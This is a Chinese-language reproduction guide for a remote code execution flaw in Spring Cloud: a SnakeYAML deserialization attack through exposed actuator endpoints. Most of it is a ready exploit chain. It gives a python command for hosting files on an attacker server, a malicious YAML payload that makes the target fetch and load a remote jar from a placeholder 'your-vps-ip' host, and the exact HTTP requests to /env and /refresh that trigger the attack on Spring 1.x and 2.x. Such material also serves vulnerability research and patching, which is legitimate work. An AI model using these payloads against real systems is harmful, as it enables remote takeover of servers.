Spring Cloud SnakeYAML RCE
==========================

一、漏洞简介
------------

#### 利用条件：

-   可以 POST 请求目标网站的 `/env` 接口设置属性
-   可以 POST 请求目标网站的 `/refresh` 接口刷新配置（存在
    `spring-boot-starter-actuator` 依赖）
-   目标依赖的 `spring-cloud-starter` 版本 \< 1.3.0.RELEASE
-   目标可以请求攻击者的 HTTP 服务器（请求可出外网）

二、漏洞影响
------------

三、复现过程
------------

#### 漏洞分析：

1.  spring.cloud.bootstrap.location 属性被设置为外部恶意 yml 文件 URL
    地址
2.  refresh 触发目标机器请求远程 HTTP 服务器上的 yml 文件，获得其内容
3.  SnakeYAML 由于存在反序列化漏洞，所以解析恶意 yml
    内容时会完成指定的动作
4.  先是触发 java.net.URL 去拉取远程 HTTP 服务器上的恶意 jar 文件
5.  然后是寻找 jar 文件中实现 javax.script.ScriptEngineFactory
    接口的类并实例化
6.  实例化类时执行恶意代码，造成 RCE 漏洞

### 漏洞复现

##### 步骤一： 托管 yml 和 jar 文件

在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP
服务端口（80、443）

    # 使用 python 快速开启 http server

    python2 -m SimpleHTTPServer 80
    python3 -m http.server 80

在网站根目录下放置后缀为 `yml` 的文件 `example.yml`，内容如下：

    !!javax.script.ScriptEngineManager [
      !!java.net.URLClassLoader [[
        !!java.net.URL ["http://your-vps-ip/example.jar"]
      ]]
    ]

在网站根目录下放置后缀为 `jar` 的文件
`example.jar`，内容是要执行的代码，代码编写及编译方式参考 yaml-payload

    https://github.com/artsploit/yaml-payload

##### 步骤二： 设置 spring.cloud.bootstrap.location 属性

spring 1.x

    POST /env
    Content-Type: application/x-www-form-urlencoded

    spring.cloud.bootstrap.location=http://your-vps-ip/example.yml

spring 2.x

    POST /actuator/env
    Content-Type: application/json

    {"name":"spring.cloud.bootstrap.location","value":"http://your-vps-ip/example.yml"}

##### 步骤三： 刷新配置

spring 1.x

    POST /refresh
    Content-Type: application/x-www-form-urlencoded

spring 2.x

    POST /actuator/refresh
    Content-Type: application/json
